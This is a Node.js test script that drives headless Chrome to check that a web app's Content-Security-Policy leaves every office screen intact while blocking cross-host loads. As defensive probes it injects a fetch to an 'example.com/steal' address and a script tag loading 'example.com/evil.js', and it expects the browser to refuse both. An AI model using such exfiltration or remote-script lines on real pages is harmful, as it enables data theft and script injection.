/**
 * EVERY SCREEN, OPENED IN A REAL BROWSER, WITH THE POLICY ON.
 *
 *   node scripts/browse-csp.js
 *
 * A Content-Security-Policy is a rule the browser enforces, so the only
 * honest way to know whether it breaks this app is to let a browser open
 * the pages and say so. Chrome prints "Refused to load..." for anything the
 * policy turns away; this collects those and fails on them.
 *
 * Both halves are checked:
 *
 *   NOTHING THE OFFICE USES IS REFUSED - every screen in the sidebar, the
 *   sign-in page, the forgotten-password page and the customer's own page
 *   are opened, and each one has to draw with no violation at all.
 *
 *   AND THE POLICY IS REALLY ON - a page is asked to fetch another host and
 *   to load a script from one, and both have to be refused. Without that
 *   this file would pass just as well against a server with no policy.
 *
 * Throwaway database of its own. Never live.
 */
require('dotenv').config();
const path = require('path');
const os = require('os');
const fs = require('fs');
const net = require('net');
const mysql = require('mysql2/promise');
const { spawn } = require('child_process');

const ROOT = path.join(__dirname, '..');
const TEST_DB = 'arabella_csp_probe';
const LIVE_DB = process.env.DB_NAME;

process.env.DB_NAME = TEST_DB;
process.env.ADMIN_EMAIL = 'probe@test.local';
process.env.ADMIN_PASSWORD = 'probe-pass-123';
process.env.PORT = '0';
// The portal's restricted login belongs to the LIVE server, and a developer's
// .env carries it. This suite builds its own throwaway database where that
// user does not exist, so the variables are cleared and the portal falls back
// to the pool this suite did set up - see config/clientDb.js.
// Emptied rather than deleted: dotenv fills in a variable that is MISSING
// from the environment, and a helper that calls dotenv.config() again would
// hand the live login straight back - which is exactly what happened the
// first time this was written.
process.env.CLIENT_DB_USER = '';
process.env.CLIENT_DB_PASSWORD = '';


{
  const p = require.resolve(path.join(ROOT, 'utils/mailer.js'));
  require.cache[p] = {
    id: p, filename: p, loaded: true,
    exports: {
      sendMail: async () => ({ sent: true }),
      verifyMail: async () => ({ ok: true }),
      isMailConfigured: () => true,
    },
  };
}

const CHROME = [
  'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
  'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
].find(p => fs.existsSync(p));

let pass = 0, fail = 0;
const check = (name, ok, extra) => {
  if (ok) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra === undefined ? '' : '  ->  ' + JSON.stringify(extra))); }
};
const NL = String.fromCharCode(10);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function freePort() {
  return new Promise((res, rej) => {
    const s = net.createServer();
    s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => res(p)); });
    s.on('error', rej);
  });
}

// The screens the office actually opens, by the address each one has.
const SCREENS = [
  '/app', '/app/till-approval', '/app/production-bd', '/app/dispatch-bd',
  '/app/corrections', '/app/prospects', '/app/cc-prospects', '/app/bf-prospects',
  '/app/scot', '/app/fms-task', '/app/fms-admin', '/app/pms-dashboard',
  '/app/my-tasks', '/app/orders-steps', '/app/workflow', '/app/step-settings',
  '/app/stock', '/app/inventory', '/app/leave', '/app/tasks', '/app/hr',
  '/app/recruitment', '/app/pricing-calculator', '/app/analytics', '/app/report',
  '/app/logs', '/app/user-activity', '/app/design-catalogue',
  '/app/envelope-liners', '/app/users', '/app/access',
];
const PUBLIC_PAGES = ['/login', '/forgot', '/track', '/client/arabella'];

(async () => {
  if (!CHROME) throw new Error('Chrome not found.');
  if (!LIVE_DB || LIVE_DB === TEST_DB) throw new Error('refusing to run against DB_NAME');

  const admin = await mysql.createConnection({
    host: process.env.DB_HOST, port: process.env.DB_PORT || 3306,
    user: process.env.DB_USER, password: process.env.DB_PASSWORD,
  });
  await admin.query('DROP DATABASE IF EXISTS `' + TEST_DB + '`');
  await admin.query('CREATE DATABASE `' + TEST_DB + '` CHARACTER SET utf8mb4');

  const app = require(path.join(ROOT, 'server.js'));
  await require(path.join(ROOT, 'config/initDb.js')).ensureSchema();
  const db = require(path.join(ROOT, 'config/db.js'));

  // A little data, so the boards draw rows rather than an empty state.
  await db.query(
    `INSERT INTO orders (order_id, dealer_name, client_name, design_status,
                         design_approval_status_from_client, no_of_design_revision,
                         status_4, timestamp, actual_1, actual_2)
     VALUES ('K-CSP-1','Dealer C','Client C','Approved','Proofing Done',1,
             'Ready', NOW(), NOW(), NOW())`);

  const port = await freePort();
  const server = app.listen(port);
  const BASE = 'http://127.0.0.1:' + port;

  const dbg = await freePort();
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'csp-'));
  const chrome = spawn(CHROME, [
    '--headless=new', '--remote-debugging-port=' + dbg,
    '--user-data-dir=' + profile, '--no-first-run', '--window-size=1600,1000',
    'about:blank',
  ], { stdio: 'ignore' });

  let ws, id = 0;
  const waiting = new Map();
  let violations = [];

  const tidy = async () => {
    try { ws && ws.close(); } catch (e) {}
    chrome.kill();
    try { fs.rmSync(profile, { recursive: true, force: true }); } catch (e) {}
    try { server.close(); } catch (e) {}
    try { await db.end(); } catch (e) {}
    try {
      await admin.query('DROP DATABASE IF EXISTS `' + TEST_DB + '`');
      await admin.end();
    } catch (e) {}
  };

  try {
    let targets;
    for (let i = 0; i < 60; i++) {
      try {
        targets = await fetch('http://127.0.0.1:' + dbg + '/json/list').then(r => r.json());
        if (targets.some(t => t.webSocketDebuggerUrl)) break;
      } catch (e) { /* not up yet */ }
      await sleep(250);
    }
    ws = new WebSocket(targets.find(t => t.webSocketDebuggerUrl).webSocketDebuggerUrl);
    await new Promise(r => { ws.onopen = r; });

    // Chrome says "Refused to ..." for every blocked load, on the Log domain
    // for resources and on the console for the rest. Both are collected.
    const noteIfViolation = (text) => {
      if (/refused to (load|connect|apply|run|frame|execute)/i.test(String(text || ''))
        || /Content Security Policy/i.test(String(text || ''))) {
        violations.push(String(text).slice(0, 200));
      }
    };

    ws.onmessage = (m) => {
      const msg = JSON.parse(m.data);
      if (msg.id && waiting.has(msg.id)) { waiting.get(msg.id)(msg); waiting.delete(msg.id); }
      if (msg.method === 'Log.entryAdded') noteIfViolation(msg.params.entry.text);
      if (msg.method === 'Runtime.consoleAPICalled') {
        noteIfViolation((msg.params.args || []).map(a => a.value).join(' '));
      }
    };
    const send = (method, params) => new Promise(res => {
      const n = ++id; waiting.set(n, res);
      ws.send(JSON.stringify({ id: n, method, params: params || {} }));
    });
    const ev = async (expression) => {
      const r = await send('Runtime.evaluate',
        { expression, returnByValue: true, awaitPromise: true });
      return r.result && r.result.result && r.result.result.value;
    };

    await send('Runtime.enable');
    await send('Log.enable');
    await send('Page.enable');
    await send('Network.enable');

    await send('Page.navigate', { url: BASE + '/login' });
    await sleep(1200);
    await ev("document.querySelector('input[type=email],input[name=email]').value='"
      + process.env.ADMIN_EMAIL + "';"
      + "document.querySelector('input[type=password]').value='"
      + process.env.ADMIN_PASSWORD + "';"
      + "document.querySelector('form').submit();");
    await sleep(2500);

    // ── THE POLICY IS REALLY ON ──
    console.log(NL + 'The policy itself');
    const header = await fetch(BASE + '/login').then(r => r.headers.get('content-security-policy'));
    check('every page carries a policy', !!header, header);
    for (const bit of ["connect-src 'self'", "object-src 'none'",
      "base-uri 'self'", "form-action 'self'", "frame-ancestors 'none'"]) {
      check('it says ' + bit, String(header || '').includes(bit));
    }

    violations = [];
    const reached = await ev(
      "fetch('https://example.com/steal', {mode:'cors'}).then(() => 'went out')"
      + ".catch(() => 'refused')");
    check('a page cannot post to another host', reached === 'refused', reached);
    check('and the browser said why',
      violations.some(v => /connect-src|Refused to connect/i.test(v)), violations[0]);

    violations = [];
    await ev("(function(){var s=document.createElement('script');"
      + "s.src='https://example.com/evil.js';document.head.appendChild(s);})()");
    await sleep(800);
    // Chrome words this one as "Loading the script ... violates" rather
    // than "Refused to load", so both spellings are accepted - what matters
    // is that script-src is the directive that turned it away.
    check('nor load a script from one',
      violations.some(v => /script-src/i.test(v)
        && /(refused to load|violates)/i.test(v)), violations);

    // ── AND NOTHING THE OFFICE USES IS REFUSED ──
    console.log(NL + 'Every screen, drawn with the policy on');
    const broken = [];
    for (const screen of SCREENS.concat(PUBLIC_PAGES)) {
      violations = [];
      await send('Page.navigate', { url: BASE + screen });
      await sleep(900);
      // Give a board with a fetch in it a moment to finish drawing.
      for (let i = 0; i < 8 && !(await ev('document.readyState === "complete"')); i++) {
        await sleep(250);
      }
      await sleep(400);
      if (violations.length) broken.push(screen + ': ' + violations[0]);
    }
    check('no screen has anything refused', broken.length === 0, broken.slice(0, 6));
    check('all of them were opened', SCREENS.length + PUBLIC_PAGES.length === 35,
      SCREENS.length + PUBLIC_PAGES.length);

    // The sign-in page still has its logo, its fonts and its icons.
    violations = [];
    await send('Page.navigate', { url: BASE + '/login' });
    await sleep(1500);
    check('the sign-in page still loads its stylesheet',
      await ev("!!Array.from(document.styleSheets).find(s => /bootstrap/.test(s.href || ''))"));
    check('and its icon font',
      await ev("!!Array.from(document.styleSheets).find(s => /font-awesome/.test(s.href || ''))"));
    check('with nothing refused on it', violations.length === 0, violations);

    console.log(NL + pass + ' passed, ' + fail + ' failed');
  } finally {
    await tidy();
    console.log('Throwaway database dropped, browser closed.');
  }
  process.exit(fail ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
